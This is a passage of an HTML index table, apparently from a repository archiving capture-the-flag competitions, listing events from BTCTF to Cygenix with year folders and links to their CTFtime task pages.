target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BTCTF\">BTCTF</a></td>\n            <td><a href=\"ctfs/BTCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2340/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/BYUCTF\">BYUCTF</a></td>\n            <td><a href=\"ctfs/BYUCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2715/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BYUCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2540/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BYUCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1935/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BYUCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1660/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/BackdoorCTF\">BackdoorCTF</a></td>\n            <td><a href=\"ctfs/BackdoorCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2153/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BackdoorCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2153/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BackdoorCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1796/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BackdoorCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/850/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BalCCon\">BalCCon</a></td>\n            <td><a href=\"ctfs/BalCCon/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1100/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/Balsn\">Balsn</a></td>\n            <td><a href=\"ctfs/Balsn/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2056/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Balsn/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1697/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Balsn/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1376/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Balsn/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1122/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Balsn/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/811/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BambooFox\">BambooFox</a></td>\n            <td><a href=\"ctfs/BambooFox/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1234/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Bauhinia\">Bauhinia</a></td>\n            <td><a href=\"ctfs/Bauhinia/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1960/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Bearcat\">Bearcat</a></td>\n            <td><a href=\"ctfs/Bearcat/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2596/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Bearcat/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2208/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BlackhatMEA\">BlackhatMEA</a></td>\n            <td><a href=\"ctfs/BlackhatMEA/2022/Quals\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1733/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BlazCTF\">BlazCTF</a></td>\n            <td><a href=\"ctfs/BlazCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2492/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BlazCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2145/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Blaze\">Blaze</a></td>\n            <td><a href=\"ctfs/Blaze/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/790/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Blaze/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/591/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BlitzCTF\">BlitzCTF</a></td>\n            <td><a href=\"ctfs/BlitzCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2816/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/BlockHarbor\">BlockHarbor</a></td>\n            <td><a href=\"ctfs/BlockHarbor/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2387/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BlockHarbor/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2063/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BlueArena\">BlueArena</a></td>\n            <td><a href=\"ctfs/BlueArena/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2684/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/BlueHens\">BlueHens</a></td>\n            <td><a href=\"ctfs/BlueHens/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2512/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BlueHens/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2126/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BlueHens/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1298/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BlueWater\">BlueWater</a></td>\n            <td><a href=\"ctfs/BlueWater/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2479/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BraekerCTF\">BraekerCTF</a></td>\n            <td><a href=\"ctfs/BraekerCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2181/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BreachCTF\">BreachCTF</a></td>\n            <td><a href=\"ctfs/BreachCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2671/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/BreakTheSyntax\">Break the Syntax</a></td>\n            <td><a href=\"ctfs/BreakTheSyntax/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2289/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BreakTheSyntax/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1940/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BreakTheSyntax/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1677/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BreakTheSyntax/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1303/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BroncoCTF\">BroncoCTF</a></td>\n            <td><a href=\"ctfs/BroncoCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2261/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BrunnerCTF\">BrunnerCTF</a></td>\n            <td><a href=\"ctfs/BrunnerCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2835/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Bucket\">Bucket</a></td>\n            <td><a href=\"ctfs/Bucket/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1892/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/BuckeyeCTF\">BuckeyeCTF</a></td>\n            <td><a href=\"ctfs/BuckeyeCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2449/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BuckeyeCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2074/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BuckeyeCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1740/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BuckeyeCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1434/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/ByteBandits\">Byte Bandits</a></td>\n            <td><a href=\"ctfs/ByteBandits/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1877/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ByteBandits/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1022/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ByteCTF\">Byte</a></td>\n            <td><a href=\"ctfs/ByteCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1114/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/C3CTF\">C3CTF</a></td>\n            <td><a href=\"ctfs/C3CTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/825/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/C3CTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/718/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/C3CTF/2017\">2017</a></td>\n            <td><a href=\"https://ctftime.org/event/544/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/C3CTF/2017\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CRHC\">CRHC</a></td>\n            <td><a href=\"ctfs/CRHC/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2873/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/COMPFEST\">COMPFEST</a></td>\n            <td><a href=\"ctfs/COMPFEST/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2463/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/COMPFEST/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2060/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/COMPFEST/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1811/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/COMPFEST/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1358/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/COMPFEST/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1123/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/CONFidence\">CONFidence</a></td>\n            <td><a href=\"ctfs/CONFidence/2020/Finals\">2020 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/1090/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CONFidence/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/960/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/CPCTF\">CPCTF</a></td>\n            <td><a href=\"ctfs/CPCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2760/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CPCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2338/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=8><a href=\"ctfs/CSAW\">CSAW</a></td>\n            <td><a href=\"ctfs/CSAW/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2398/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2087/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1613/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1315/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1079/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/870/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/633/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/CSAW/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CSAW/2017/Quals\">2017 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/488/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/CSAW/2017/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CSCG\">CSCG</a></td>\n            <td><a href=\"ctfs/CSCG/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2588/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CSCML\">CSCML</a></td>\n            <td><a href=\"ctfs/CSCML/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1071/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CTF@AC\">CTF@AC</a></td>\n            <td><a href=\"ctfs/CTF@AC/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2886/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CTF@CIT\">CTF@CIT</a></td>\n            <td><a href=\"ctfs/CTF@CIT/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2339/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/CTFZone\">CTFZone</a></td>\n            <td><a href=\"ctfs/CTFZone/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2839/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CTFZone/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2408/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CTFZone/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1955/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CTFZone/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/632/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Ctrl+Space\">Ctrl+Space</a></td>\n            <td><a href=\"ctfs/Ctrl+Space/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2872/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/CakeCTF\">CakeCTF</a></td>\n            <td><a href=\"ctfs/CakeCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1973/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CakeCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1683/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CatTheQuest\">CatTheQuest</a></td>\n            <td><a href=\"ctfs/CatTheQuest/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2414/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Chaff\">Chaff</a></td>\n            <td><a href=\"ctfs/Chaff/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1445/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/CCCamp\">CCCamp</a></td>\n            <td><a href=\"ctfs/CCCamp/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2048/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CCCamp/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/854/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Chujowy\">Chujowy</a></td>\n            <td><a href=\"ctfs/Chujowy/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1087/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CircleCityCon\">CircleCityCon</a></td>\n            <td><a href=\"ctfs/CircleCityCon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1350/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CodeBlue\">CODE BLUE</a></td>\n            <td><a href=\"ctfs/CodeBlue/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/636/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Codefest\">Codefest</a></td>\n            <td><a href=\"ctfs/Codefest/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2648/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/Codegate\">Codegate</a></td>\n            <td><a href=\"ctfs/Codegate/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2706/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Codegate/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2346/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Codegate/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2006/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Codegate/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1538/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Codegate/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/719/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Codegate/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/542/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/Codegate/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CrateCTF\">CrateCTF</a></td>\n            <td><a href=\"ctfs/CrateCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2489/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/CrewCTF\">CrewCTF</a></td>\n            <td><a href=\"ctfs/CrewCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2704/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CrewCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2223/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CrewCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2032/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/Crypto\">Crypto</a></td>\n            <td><a href=\"ctfs/Crypto/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2577/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Crypto/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2210/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Crypto/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1857/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Crypto/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1573/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Crypto/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1258/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Cryptoverse\">Cryptoverse</a></td>\n            <td><a href=\"ctfs/Cryptoverse/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1907/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Cryptoverse/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1735/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CubeCTF/2025\">CubeCTF</a></td>\n            <td><a href=\"ctfs/CubeCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2820/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CursedCTF/2024/Quals\">CursedCTF</a></td>\n            <td><a href=\"ctfs/CursedCTF/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2239/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CYBERGON\">CYBERGON</a></td>\n            <td><a href=\"ctfs/CYBERGON/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2058/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/CyBRICS\">CyBRICS</a></td>\n            <td><a href=\"ctfs/CyBRICS/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1306/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CyBRICS/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1012/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CybHackCTF\">CybHackCTF</a></td>\n            <td><a href=\"ctfs/CybHackCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2344/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CyberApocalypse\">CyberApocalypse</a></td>\n            <td><a href=\"ctfs/CyberApocalypse/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2674/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CyberHeroines\">CyberHeroines</a></td>\n            <td><a href=\"ctfs/CyberHeroines/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2054/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CyberLeague\">CyberLeague</a></td>\n            <td><a href=\"ctfs/CyberLeague/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2530/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/CyberSecurityRumble\">CyberSecurityRumble</a></td>\n            <td><a href=\"ctfs/CyberSecurityRumble/2023/Quals\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1942/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CyberSecurityRumble/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1665/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CyberSecurityRumble/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1429/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CyberSecurityRumble/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1057/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CyberSpace\">CyberSpace</a></td>\n            <td><a href=\"ctfs/CyberSpace/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2428/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/CyberYoddha\">CyberYoddha</a></td>\n            <td><a href=\"ctfs/CyberYoddha/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1169/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Cybercoliseum\">Cybercoliseum</a></td>\n            <td><a href=\"ctfs/Cybercoliseum/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2341/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Cybercoliseum/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2100/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Cygenix\">Cygenix</a></td>\n            <td><a href=\"ctfs/Cygenix/2024\">2024</a></td>\n            <td><a 